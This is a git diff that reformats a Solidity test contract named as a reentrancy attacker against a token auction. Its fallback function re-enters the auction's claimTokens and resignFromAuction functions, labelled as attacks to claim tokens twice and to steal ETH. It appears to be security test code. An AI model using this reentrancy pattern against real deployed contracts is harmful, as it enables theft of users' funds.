@@ -5,7 +5,6 @@ pragma abicoder v2;
 import "../../src/interfaces/IVeriAuctionTokenForEth.sol";
 
 contract VeriAuctionTokenForEth_reentrancy_attacker {
-
     //========================================
     // Variables
     //========================================
@@ -34,8 +33,8 @@ contract VeriAuctionTokenForEth_reentrancy_attacker {
     // functions
     //========================================
 
-    fallback () external payable {
-        if(claimTokens){
+    fallback() external payable {
+        if (claimTokens) {
             // Attack 1: Claim tokens and commitment.
 
             (bool success, ) = msg.sender.call(abi.encodeWithSelector(IVeriAuctionTokenForEth.claimTokens.selector));
@@ -43,9 +42,11 @@ contract VeriAuctionTokenForEth_reentrancy_attacker {
         } else {
             // Attack 2: Steal ETH from the auction.
 
-            if(timesToAttack > 0) {
+            if (timesToAttack > 0) {
                 timesToAttack--;
-                (bool success, ) = msg.sender.call(abi.encodeWithSelector(IVeriAuctionTokenForEth.resignFromAuction.selector));
+                (bool success, ) = msg.sender.call(
+                    abi.encodeWithSelector(IVeriAuctionTokenForEth.resignFromAuction.selector)
+                );
                 require(success, "Failed to claim ETH");
             }
         }
